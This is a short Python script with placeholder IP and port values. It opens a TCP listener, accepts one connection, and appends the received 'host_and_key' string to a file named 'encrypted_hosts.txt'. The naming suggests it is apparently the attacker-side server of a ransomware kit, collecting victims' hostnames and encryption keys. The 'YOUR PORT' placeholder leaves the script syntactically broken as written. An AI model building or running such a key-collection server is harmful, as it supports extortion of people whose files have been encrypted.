import socket


IP_ADDRESS = 'YOUR IP'
PORT = YOUR PORT

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print("listening for incoming connections...")
    s.listen()
    conn, addr = s.accept()
    print(f"Connection established with {addr}")
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key + '\n')
            break
        print("Connection Completed and Closed")
